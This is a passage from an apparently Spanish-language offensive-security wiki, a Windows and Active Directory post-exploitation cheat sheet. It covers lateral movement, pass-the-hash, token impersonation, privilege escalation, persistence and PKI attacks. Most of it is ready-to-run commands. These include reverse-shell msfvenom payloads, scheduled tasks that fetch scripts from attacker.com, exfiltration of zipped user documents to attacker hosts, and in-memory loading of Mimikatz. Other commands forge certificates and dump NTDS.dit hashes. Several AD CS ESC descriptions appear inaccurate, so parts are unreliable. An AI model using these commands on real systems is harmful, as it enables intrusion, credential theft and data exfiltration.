
```cmd
# Con winrs (nativo)
winrs -r:192.168.1.101 -u:DOMINIO\admin -p:Pass123! "cmd.exe /c whoami"

# Con PowerShell Remoting
powershell "New-PSSession -ComputerName 192.168.1.101 -Credential DOMINIO\admin"
powershell "Invoke-Command -ComputerName 192.168.1.101 -ScriptBlock { whoami }"

# Con evil-winrm (Linux - recomendado)
evil-winrm -i 192.168.1.101 -u admin -p Pass123!
evil-winrm -i 192.168.1.101 -u admin -H NTHASH

# Con impacket
impacket-winrm dominio.com/admin:Pass123@192.168.1.101
```

### 22.4 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) (Distributed [com](../raw/w1n-s9bsyst3ms.md#com))

```cmd
# Excel DCOM (necesita Excel instalado)
powershell -c " $com = [Type]::GetTypeFromCLSID('00024500-0000-0000-C000-000000000046','192.168.1.101'); $obj = [System.Activator]::CreateInstance($com); $obj.Application.Run('cmd.exe /c calc')"

# MMC DCOM
powershell -c " $com = [Type]::GetTypeFromCLSID('CLSID_MMC_Application','192.168.1.101'); $obj = [System.Activator]::CreateInstance($com); $obj.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','Minimized')"
```

### 22.5 SCCM (System Center Configuration Manager)

```cmd
# También conocido como ConfigMgr
# Si hay un servidor SCCM, podés usarlo para ejecutar en todos los clientes

# Buscar servidor SCCM
reg query HKLM\SOFTWARE\Microsoft\SMS\DP /v SiteCode

# Ejecutar paquete en clientes
# Usando WMIC o PowerShell contra el servidor SCCM
```

### 22.6 Schtasks Remoto

```cmd
# Crear scheduled task remoto
schtasks /create /s 192.168.1.101 /u admin /p Pass123! /tn "EvilTask" /tr "C:\Windows\Tasks\evil.exe" /sc once /st 00:00

# Ejecutar inmediatamente
schtasks /run /s 192.168.1.101 /u admin /p Pass123! /tn "EvilTask"

# Limpiar
schtasks /delete /s 192.168.1.101 /u admin /p Pass123! /tn "EvilTask" /f
```

---

## 23. RDP Session Hijacking

### 23.1 Conectar a Sesión Existente

```cmd
# Ver sesiones activas
query user
qwinsta
query session

# Con privilegios SYSTEM, conectar a cualquier sesión
# Listar sesiones:
C:\Windows\System32\tscon.exe SESSION_ID

# Conectar sin contraseña (necesita SYSTEM):
C:\Windows\System32\tscon.exe 1 /dest:console
```

### 23.2 Habilitar RDP en Máquina Remota

```cmd
# Habilitar RDP (necesita admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Crear usuario y agregar a RDP
net user admin Pass123! /add
net localgroup Administrators admin /add
net localgroup "Remote Desktop Users" admin /add
```

---

## 24. pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) / [pass-the-ticket](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket) / Overpass-the-[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)

### 24.1 [pass-the-hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash)

Usar el hash NTLM directamente (sin conocer la contraseña):

```cmd
# Con impacket (Linux):
impacket-wmiexec -hashes LMHASH:NTHASH dominio/admin@192.168.1.101
impacket-psexec -hashes LMHASH:NTHASH dominio/admin@192.168.1.101
impacket-smbexec -hashes LMHASH:NTHASH dominio/admin@192.168.1.101

# Con crackmapexec:
crackmapexec smb 192.168.1.101 -u admin -H NTHASH -x "whoami"
crackmapexec smb 192.168.1.101 -u admin -H NTHASH --lsa
crackmapexec smb 192.168.1.101 -u admin -H NTHASH --sam
crackmapexec smb targets.txt -u admin -H NTHASH -x "ipconfig"

# Con Mimikatz (en Windows):
mimikatz # sekurlsa::pth /user:admin /domain:dominio.com /ntlm:NTHASH /run:powershell.exe
# En la nueva ventana de powershell, conectás como el admin:
dir \\192.168.1.101\c$

# Con xfreerdp (RDP con hash - solo si está habilitado Restricted Admin):
xfreerdp /v:192.168.1.101 /u:admin /pth:NTHASH /cert:ignore
```

### 24.2 Pass-the-Ticket

```cmd
# Exportar tickets de sesión actual
mimikatz # sekurlsa::tickets /export

# Importar ticket en otra sesión
mimikatz # kerberos::ptt ticket.kirbi

# Verificar
klist

# Con Rubeus:
Rubeus.exe asktgt /user:admin /domain:dominio.com /rc4:HASH /ptt
Rubeus.exe ptt /ticket:ticket.kirbi
```

### 24.3 Overpass-the-Hash (NTLM → Kerberos)

Convertís un hash NTLM en un ticket Kerberos TGT:

```cmd
# Con Rubeus:
Rubeus.exe asktgt /user:admin /domain:dominio.com /rc4:NTHASH /ptt

# Con impacket:
impacket-getTGT -hashes :NTHASH dominio.com/admin
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass dominio.com/admin@192.168.1.101

# Con crackmapexec (usando kerberos):
crackmapexec smb 192.168.1.101 -u admin -H NTHASH -k -x "whoami"
```

---

## 25. Token Manipulation

### 25.1 Token Impersonation con Incognito

```cmd
# Cargar incognito en meterpreter
meterpreter > load incognito
meterpreter > list_tokens -u                      # Listar tokens disponibles
meterpreter > list_tokens -g                      # Tokens de grupo
meterpreter > impersonate_token DOMINIO\\Admin    # Impersonar
meterpreter > impersonate_token DOMINIO\\SYSTEM
meterpreter > rev2self                            # Volver al original

# Incognito standalone (Windows):
incognito.exe list_tokens -u
incognito.exe execute -c "DOMINIO\Admin" cmd.exe
```

### 25.2 Token Duplication con [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)

```powershell
# Duplicar token de proceso SYSTEM
# Con Invoke-TokenManipulation de PowerSploit:
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')

# Listar tokens
Invoke-TokenManipulation -Enumerate

# Impersonar token específico
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Duplicar token de proceso
Invoke-TokenManipulation -ProcessId 1234

# Crear proceso con token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234
```

---

## 26. [privilege escalation](../raw/l1n9x-pr1v3sc.md) — [escalada de privilegios](../raw/l1n9x-pr1v3sc.md)

### 26.1 [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) Exploits

```cmd
# Listar hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Usar Windows-Exploit-Suggester:
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# Usar Watson (PowerShell):
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Watson/master/Watson.ps1'); Find-AllVulns"

# Exploits comunes:
# MS17-010 (EternalBlue) - SMB
# MS16-032 - Secondary Logon Handle
# MS16-135 - Win32k
# CVE-2021-1732 - Win32k
# PrintNightmare (CVE-2021-34527) - Print Spooler
# NoPac (CVE-2021-42278/42287) - AD
```

### 26.2 Service Misconfigurations

```cmd
# PowerUp (PowerShell):
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"

# Buscar servicios con PATH modificable
icacls "C:\Program Files\SomeService" /grant Everyone:F
wmic service get name,displayname,pathname,startname | findstr /i "LocalSystem"

# Si un servicio corre como SYSTEM y podés modificar su binario:
copy evil.exe "C:\Program Files\SomeService\service.exe"
sc stop SomeService
sc start SomeService
```

### 26.3 AlwaysInstallElevated

```cmd
# Verificar si está habilitado
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si ambos devuelven 1, cualquier MSI corre como SYSTEM:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### 26.4 Unquoted Service Paths

```cmd
# Buscar paths sin comillas
wmic service get name,displayname,pathname,startname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Si encontrás: "C:\Program Files\My App\service.exe"
# Podés poner un exe en:
# C:\Program.exe (se ejecuta antes que el path completo)
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe

# Después de colocar el exe, reiniciar el servicio
sc stop ServiceName
sc start ServiceName
```

### 26.5 Token Impersonation (SeImpersonatePrivilege)

```cmd
# Verificar si tenés SeImpersonatePrivilege
whoami /priv | findstr Impersonate

# Si lo tenés, usá:
# JuicyPotato (Windows Server 2008/2012)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

# RoguePotato (Windows 10/2016+)
RoguePotato.exe -r 192.168.1.100 -e "cmd.exe /c whoami"

# PrintSpoofer (Windows 10/2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato (Windows Server 2019/2022+)
GodPotato.exe -cmd "cmd /c whoami"
```

---

## 27. [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) (Métodos Avanzados)

### 27.1 Startup Folder

```cmd
# Current user
copy evil.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
# All users (admin)
copy evil.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

### 27.2 Registry Run Keys

```cmd
# Current user
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Tasks\evil.exe"
# All users (admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityScan /t REG_SZ /d "C:\Windows\Tasks\evil.exe"

# Otras keys de persistencia:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

### 27.3 Scheduled Tasks

```cmd
# Como admin
schtasks /create /tn "GoogleUpdate" /tr "C:\Windows\Tasks\evil.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Tasks\evil.exe" /sc daily /st 09:00
schtasks /create /tn "Updater" /tr "C:\Windows\Tasks\evil.exe" /sc onstart /ru SYSTEM
schtasks /create /tn "DLLHost" /tr "powershell -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/ps.ps1\")'" /sc minute /mo 1
```

### 27.4 Service Persistence

```cmd
sc create "SecurityService" binPath="C:\Windows\Tasks\evil.exe" start=auto
sc start "SecurityService"

# Como servicio interactivo
sc create "WinMon" binPath="cmd.exe /c C:\Windows\Tasks\evil.exe" start=auto obj="LocalSystem"
```

### 27.5 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Event Subscription

```cmd
# Persistencia WMI (sin archivos en disco)
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Persistence/Persistence.ps1'); Add-Persistence -FireOn -Daily -At 09:00 -Payload -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1') }"

# Manualmente:
# 1. Crear __EventFilter (cada vez que se inicia sesión)
# 2. Crear CommandLineEventConsumer (ejecuta el payload)
# 3. Crear __FilterToConsumerBinding
```

### 27.6 [bootkit](../raw/u3f1-r00tk1ts.md#bootkits) (Boot Configuration)

```cmd
# Modificar BCD para cargar un bootkit
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Reemplazar boot manager (complejo, requiere firmas)
```

### 27.7 [com](../raw/w1n-s9bsyst3ms.md#com) / DLL Hijacking (Persistente)

```cmd
# Reemplazar entries de COM que se cargan al inicio
# Buscar CLSIDs que cargan DLLs sin path absoluto
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /e | findstr ".dll"

# Si un servicio carga una DLL que no encuentra, poner la nuestra
```

---

## 28. Exfiltración de Datos

### 28.1 Compresión

```cmd
# Con PowerShell
powershell Compress-Archive -Path C:\Users\*\Documents\ -DestinationPath C:\Windows\Temp\docs.zip

# Con 7-Zip (si está instalado)
"C:\Program Files\7-Zip\7z.exe" a -tzip C:\Windows\Temp\docs.zip C:\Users\*\Documents\

# Compact (nativo Vista+)
compact /C C:\Users\*\Documents\*.* /EXE
```

### 28.2 Exfiltración por Protocolos

```cmd
# HTTP(S)
powershell -c "Invoke-WebRequest -Uri http://192.168.1.100/upload -Method POST -InFile C:\Windows\Temp\docs.zip"

# SMB
copy C:\Windows\Temp\docs.zip \\192.168.1.100\share\

# FTP
echo open 192.168.1.100 > ftp.txt
echo anonymous >> ftp.txt
echo password >> ftp.txt
echo put C:\Windows\Temp\docs.zip >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt

# DNS (lento pero sigiloso)
# Con dnscat2 en el atacante:
ruby dnscat2.rb --dns domain=attacker.com
# En la víctima:
dnscat2-v0.07-client.exe --dns server=attacker.com

# Bitsadmin
bitsadmin /transfer job /download /priority high http://attacker.com/evil.exe C:\Temp\evil.exe

# Certutil (encode y exfiltrar)
certutil -encode C:\Windows\Temp\docs.zip C:\Windows\Temp\docs.b64
type C:\Windows\Temp\docs.b64 | clip
# Después pegarlo en tu máquina
```

---

## 29. Herramientas Indispensables (Carga Rápida)

```powershell
# Cargar herramientas desde memoria sin tocar disco

# PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# Mimikatz (nishang)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')

# PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')

# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang.ps1')

# SharpHound (descarga y ejecuta)
$wc = New-Object Net.WebClient; $wc.DownloadFile('http://attacker.com/SharpHound.exe', 'C:\Temp\sh.exe')
C:\Temp\sh.exe -c All

# Certify
$wc = New-Object Net.WebClient; $wc.DownloadFile('http://attacker.com/Certify.exe', 'C:\Temp\cert.exe')
C:\Temp\cert.exe find /vulnerable

# Rubeus
$wc = New-Object Net.WebClient; $wc.DownloadFile('http://attacker.com/Rubeus.exe', 'C:\Temp\rub.exe')
C:\Temp\rub.exe asktgt /user:admin /domain:dominio.com /rc4:HASH /ptt

---

## 30. AD CS — Guía Completa ESC1 a ESC13

### 30.1 ESC1 — Subject Alternative Name (SAN) Abuse

Cuando un template permite al solicitante especificar SAN (Subject Alternative Name), cualquier usuario puede pedir un certificado como otro usuario:

```cmd
# Encontrar templates vulnerables con Certify
Certify.exe find /vulnerable

# Certify busca específicamente ESC1:
# - Client Authentication o Smart Card Logon en Enhanced Key Usage
# - Enrollee Supplies Subject en flags
# - Permisos de enroll para nuestro usuario/grupo

# Pedir certificado como Administrador del dominio
Certify.exe request /ca:DC.dominio.[com](../raw/w1n-s9bsyst3ms.md#com)\CA-NOMBRE /template:VULN-TEMPLATE /altname:Administrador

# Con SAN específico
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:Administrador /domain:dominio.com

# Pedir certificado como cualquier usuario
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:srv-sql-01.dominio.com

# Usar el certificado para autenticarse
# Convertir a PFX y usar con impacket:
certipy-[ad](../raw/w1nd0ws-d0m41n-4dm1n.md) req -ca CA-NOMBRE -template VULN-TEMPLATE -target DC.dominio.com -upn admin@dominio.com

# Crackear la clave privada del certificado (si tiene passphrase)
python3 /opt/[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)/run/pfx2john.py cert.pfx > cert_hash.txt
john cert_hash.txt --wordlist=rockyou.txt
```

### 30.2 ESC2 — Any Purpose Key Usage

El template permite "Any Purpose" en Enhanced Key Usage (EKU), lo que significa que el certificado se puede usar para cualquier cosa, incluyendo autenticación:

```cmd
Certify.exe find /vulnerable
# Buscar: EKU = Any Purpose (2.5.29.37.0)

# Pedir certificado
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE

# Usar el certificado para autenticación Kerberos
certipy-ad auth -pfx cert.pfx -username Administrador -domain dominio.com -dc-[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) 192.168.1.100

# O usarlo como Enrollment Agent para pedir otros certificados
certreq -new -attrib "CertificateTemplate:DomainController" dc.req
```

### 30.3 ESC3 — Enrollment Agent Templates

Un template de Enrollment Agent mal configurado permite a un usuario pedir certificados en nombre de otros:

```cmd
Certify.exe find /vulnerable
# Buscar: Template es "Enrollment Agent" o similar
# O Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)

# Paso 1: Pedir certificado de Enrollment Agent
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:EnrollmentAgent

# Paso 2: Usar el enrollment agent cert para pedir como otro
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:User /onbehalfof:Administrador /enrollmentagent:enrollment_agent_cert.pfx

# Con certipy:
certipy-ad req -ca CA-NOMBRE -template EnrollmentAgent -target DC.dominio.com -upn user@dominio.com -out agent.pfx
certipy-ad req -ca CA-NOMBRE -template User -target DC.dominio.com -upn admin@dominio.com -on-behalf-of agent.pfx
```

### 30.4 ESC4 — Template ACL Misconfiguration

El ACL del template permite a usuarios regulares modificar propiedades del template (agregar SAN, cambiar EKU, etc.):

```cmd
# Encontrar templates con ACL débil
Certify.exe find /vulnerable
# Buscar: Template ACL permite escritura a nuestro usuario

# Con certipy (recomendado para ESC4):
# Agregar SAN al template vulnerable
certipy-ad template -template VULN-TEMPLATE -save-old -debug -dc-ip 192.168.1.100

# Ahora el template permite SAN, lo explotamos como ESC1
certipy-ad req -ca CA-NOMBRE -template VULN-TEMPLATE -target DC.dominio.com -upn admin@dominio.com

# Restaurar template original
certipy-ad template -template VULN-TEMPLATE -restore VULN-TEMPLATE.json

# Alternativa manual con PowerShell:
$template = Get-ADObject -Identity "CN=VULN-TEMPLATE,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=com" -Properties *
$template | [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ADObject -Add @{pKIExtendedKeyUsage='1.3.6.1.4.1.311.20.2.2'}
# Después de modificar, publicar y explotar
```

### 30.5 ESC5 — CA ACL Misconfiguration

Los permisos de la CA (Certificate Authority) están mal configurados, permitiendo a usuarios normales administrarla:

```cmd
# CA ACL vulnerable significa que podemos:
# 1. Modificar settings de la CA
# 2. Aprobar requests pendientes (ver ESC7)
# 3. Revocar certificados
# 4. Cambiar los templates disponibles

# Ver permisos de la CA con certutil
certutil -config "DC.dominio.com\CA-NOMBRE" -getreg ca\Security

# Ver con PowerShell
[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) "Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)' -Properties ntSecurityDescriptor"

# Si tenés permisos de "Manage CA", habilitar ESC6
certutil -config "DC.dominio.com\CA-NOMBRE" -setreg ca\EDITF_ATTRIBUTESUBJECTALTNAME2 1
net stop certsvc && net start certsvc
# Ahora todos los templates son vulnerables a ESC1
```

### 30.6 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

Si la CA tiene habilitado el flag EDITF_ATTRIBUTESUBJECTALTNAME2, cualquier template permite SAN (aunque no lo tenga configurado):

```cmd
# Verificar el flag
certutil -config "DC.dominio.com\CA-NOMBRE" -getreg ca\EDITF_ATTRIBUTESUBJECTALTNAME2
# Si devuelve "EDITF_ATTRIBUTESUBJECTALTNAME2" = 0x1 → VULNERABLE

# Explotar (cualquier template es usable para ESC1)
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:User /altname:Administrador

# Con certipy:
certipy-ad req -ca CA-NOMBRE -template User -target DC.dominio.com -upn admin@dominio.com

# Nota: algunos templates necesitan ser modificados ligeramente para aceptar SAN
# Pero con ESC6 habilitado, request.Attributes["SAN"] se procesa siempre
```

### 30.7 ESC7 — CA Access Control Vulnerable (Manager Approval)

La CA tiene "Manager Approval" requerido, pero tenés permisos para aprobar requests pendientes:

```cmd
# ESC7 requiere ser CA Officer o CA Manager
# 1. Listar requests pendientes
certutil -config "DC.dominio.com\CA-NOMBRE" -enforce
certutil -config "DC.dominio.com\CA-NOMBRE" -view pending

# 2. Resubmit una request pendiente (tuya)
certutil -config "DC.dominio.com\CA-NOMBRE" -resubmit REQUEST_ID

# 3. O negar la de otro
certutil -config "DC.dominio.com\CA-NOMBRE" -deny REQUEST_ID

# Con certipy (todo en uno):
certipy-ad req -ca CA-NOMBRE -template User -target DC.dominio.com -upn admin@dominio.com -approve

# Si no tenés el rol de CA Officer, pero tenés permisos de escritura en la CA:
# Podés agregarte como Officer:
certipy-ad ca -ca CA-NOMBRE -target DC.dominio.com -add-officer user
```

### 30.8 ESC8 — NTLM Relay to AD CS Web Enrollment

Relay de autenticación NTLM al servidor AD CS web enrollment (certsrv):

```cmd
# Encontrar servidores AD CS
crackmapexec ldap 192.168.1.100 -u user -p pass -M adcs

# Configurar relay
impacket-ntlmrelayx -t [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://CA-SERVER/certsrv/ -smb2support --adcs --template DomainController

# Coercer autenticación de un DC (o admin) hacia nuestro relay
# Usar Printer Bug (SpoolSample):
SpoolSample.exe DC.dominio.com ATTACKER.dominio.com
# O PetitPotam:
PetitPotam.exe ATTACKER.dominio.com DC.dominio.com

# Cuando el DC se autentica contra nuestro relay, el relay pide un certificado
# de Domain Controller al AD CS
# El certificado permite DCSync

# Usar el certificado obtenido
certipy-ad auth -pfx DC.pfx -dc-ip 192.168.1.100 -username DC$ -domain dominio.com
# Después DCSync:
impacket-secretsdump -just-dc dominio.com/Administrador@192.168.1.100 -k
```

### 30.9 ESC9 — No Security Extension (MS-DRM)

El template no tiene la extensión de seguridad (msPKI-RA-Application-Policies), permitiendo enrollear para cualquier usuario:

```cmd
Certify.exe find /vulnerable
# Buscar: falten msPKI-RA-Application-Policies o la policy no verifique el sujeto

# Explotación similar a ESC1, pero más fácil de pasar desapercibido
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:Administrador
```

### 30.10 ESC10 — Weak Certificate Request Agent Authentication

El Enrollment Agent no verifica la identidad del solicitante correctamente:

```cmd
# Si un Enrollment Agent cert fue emitido con autenticación débil
# Podés usar ese cert como agente para enrollar como cualquier usuario

# Similar a ESC3, pero sin verificación de identidad del agente
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:EnrollmentAgent
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:User /onbehalfof:Administrador /enrollmentagent:agent.pfx
```

### 30.11 ESC11 — RPC Relay to AD CS (ICERTPASS)

Relay del protocolo RPC (ICertPassage) en vez de HTTP:

```cmd
# Implantación experimental de relay RPC a AD CS
# Usar ntlmrelayx con soporte RPC:
impacket-ntlmrelayx -t [rpc](../raw/w1n-s9bsyst3ms.md#rpc)://CA-SERVER -smb2support --adcs --template DomainController

# Coercer autenticación vía RPC
PetitPotam.exe -rpc ATTACKER.dominio.com DC.dominio.com
```

### 30.12 ESC12 — Shell Access via AD CS

Si tenés acceso shell a la CA y podés modificar el template, combinás múltiples ESC para escalar:

```cmd
# ESC12 combina ESC4 + ESC1 + ESC7
# Con shell en la CA (aunque sea low-privilege), modificás templates
# y aprobás tus propias requests

# En la CA, agregar SAN al template
certutil -setreg ca\EDITF_ATTRIBUTESUBJECTALTNAME2 1
net stop certsvc && net start certsvc

# Desde tu máquina, pedir certificado como admin
certipy-ad req -ca CA-NOMBRE -template User -target DC.dominio.com -upn admin@dominio.com
```

### 30.13 ESC13 — Domain Escalation via CA

Cuando la CA tiene permisos para emitir certificados que autentican contra un dominio de confianza (forest trust), permitiendo escalar a otro dominio:

```cmd
# Encontrar trusts entre forests
nltest /domain_trusts

# Si hay trust y AD CS está configurado para emitir certificados
# para el otro dominio, podés pedir un certificado como Enterprise Admins
# del otro forest

# Usar Certify con parámetros del otro dominio
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:Administrador@otro.dominio.com

# Autenticarse en el otro dominio
certipy-ad auth -pfx cert.pfx -domain otro.dominio.com -dc-ip 192.168.2.100
```

### 30.14 Key Archival Retrieval

Si la CA tiene habilitado Key Archival (las claves privadas se guardan en la base de datos de la CA):

```cmd
# Buscar certificados con key archival
# Si tenés permisos de "Read" en claves archivadas:
certutil -config "DC.dominio.com\CA-NOMBRE" -getkey ARCHIVED_KEY_HASH

# Extraer todas las claves archivadas (necesita admin en la CA)
# La DB de la CA está en:
dir "C:\Windows\System32\CertLog\"
# Archivo: CA_NAME.edb (Extensible Storage Engine database)

# Usar herramientas forenses para extraer
python3 esedbexport -m C:\Windows\System32\CertLog\CA_NAME.edb
```

### 30.15 NTDSUtil — Extraer Hashes de la CA

```cmd
# Si tenés acceso a la CA, extraer la base de datos de AD CS
ntdsutil
activate instance "NTDS"
files
info
# Ver paths de la DB

# Extraer la DB de certificados
# C:\Windows\NTDS\ntds.dit contiene info de certificados
# si AD CS está integrado con AD
```

---

## 31. PKI Infrastructure Attacks — Ataques Completos a Infraestructura PKI

### 31.1 CA Compromise (Compromiso de la Autoridad Certificadora)

```cmd
# Una vez comprometida la CA, tenés control completo de la PKI
# 1. Extraer la clave privada de la CA
# La clave de la CA está almacenada en:
dir "C:\ProgramData\Microsoft\Crypto\[rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa)\MachineKeys\"
# O en el módulo criptográfico (HSM, TPM)

# Extraer clave de la CA con Mimikatz (si está en almacén de certificados)
[mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) # crypto::certificates /export /systemstore:CA

# O usar certutil para exportar (si tenés acceso)
certutil -config "DC.dominio.com\CA-NOMBRE" -exportPFX CA-CERTIFICATE ca.pfx

# 2. Firmar certificados falsos
# Con la clave de la CA, firmás certificados para cualquier usuario
# Necesitás openssl + la CA key

# Crear certificado falso de Domain Controller
openssl genrsa -out fake_dc.key 2048
openssl req -new -key fake_dc.key -out fake_dc.csr -subj "/CN=DC-FAKE.dominio.com"
# Firmar con la CA key
openssl ca -config ca.conf -keyfile ca.key -cert ca.crt -in fake_dc.csr -out fake_dc.crt

# 3. Emitir certificados como cualquier usuario
# Usar certipy-ad con la CA comprometida
certipy-ad forge -ca-pfx ca.pfx -upn admin@dominio.com
```

### 31.2 Certificate Template Abuse (Abuso de Plantillas)

```cmd
# Una vez comprometido el template:
# Modificar existing templates para agregar SAN
# O crear templates nuevos vulnerables

# Ver todos los templates
certutil -CATemplates | findstr "Template:"

# Desplegar un template vulnerable
# Usar PowerShell en la CA:
New-ADObject -Name "VulnerableTemplate" -Type "pKICertificateTemplate" -OtherAttributes @{
    displayName = "VulnerableTemplate"
    pKICertificateTemplate = "1.3.6.1.4.1.311.21.8"
    pKIExtendedKeyUsage = "1.3.6.1.5.5.7.3.2"
    msPKI-Certificate-Name-Flag = 1
    msPKI-Enrollment-Flag = 0
    msPKI-Minimal-Key-Size = 2048
    pKIDefaultKeySpec = 1
} -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=com"

# Publicar el template en la CA
certutil -config "DC.dominio.com\CA-NOMBRE" -setreg ca\CATemplates+VulnerableTemplate
net stop certsvc && net start certsvc
```

### 31.3 Enrollee-Supplied SAN (SAN por el Solicitante)

```cmd
# Si el template tiene "Enrollee Supplies Subject" habilitado,
# el usuario que pide el certificado puede poner cualquier SAN

# Esto es ESC1. Ver sección 30.1 para comandos detallados
# La diferencia acá es que también podés:
# - Poner SAN para múltiples nombres
# - Usar diferentes formatos de identidad (UPN, DNS, RFC822)

# SAN con múltiples identidades
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:"Administrador&dNSName=DC.dominio.com"

# SAN con UPN
Certify.exe request /ca:DC.dominio.com\CA-NOMBRE /template:VULN-TEMPLATE /altname:admin@dominio.com
```

### 31.4 Key Archival Retrieval (Recuperación de Claves Archivadas)

```cmd
# Las claves privadas archivadas en la CA pueden recuperarse
# si tenés permisos de "Key Recovery Agent"

# Ver agentes de recuperación
certutil -config "DC.dominio.com\CA-NOMBRE" -keyrecovery

# Recuperar clave archivada de un usuario específico
certutil -config "DC.dominio.com\CA-NOMBRE" -GetKey "username" recovered.key

# Desencriptar la clave recuperada
# La clave viene cifrada con la key del Key Recovery Agent
openssl smime -decrypt -in recovered.key -inkey KRA_key.pem -out private_key.pem
```

---

## 32. Domain Controller Attacks — Ataques Avanzados a DCs

### 32.1 NTDS.dit Extraction Methods

```cmd
# El NTDS.dit es la base de datos de Active Directory
# Contiene TODOS los hashes del dominio

# Método 1: ntdsutil + VSS (Volume Shadow Copy)
ntdsutil
activate instance ntds
ifm
create full C:\Temp\ntds_dump
quit
quit

# Ahora tenés:
dir C:\Temp\ntds_dump
# Active Directory\ntds.dit
# registry\SYSTEM (necesario para descifrar)

# Extraer hashes:
impacket-secretsdump -ntds "C:\Temp\ntds_dump\[active directory](../raw/w1nd0ws-d0m41n-4dm1n.md)\ntds.dit" -system "C:\Temp\ntds_dump\registry\SYSTEM" LOCAL

# Método 2: VSS via PowerShell (sin ntdsutil)
powershell -c "Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Context='C:\\Windows\\NTDS\\'}"

# Método 3: Copy-VSS (herramienta de PowerSploit)
IEX (New-Object Net.WebClient).DownloadString('[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/VolumeShadowCopyTools.ps1')
Copy-VSS -DestinationPath C:\Temp\
# Esto copia ntds.dit automágicamente

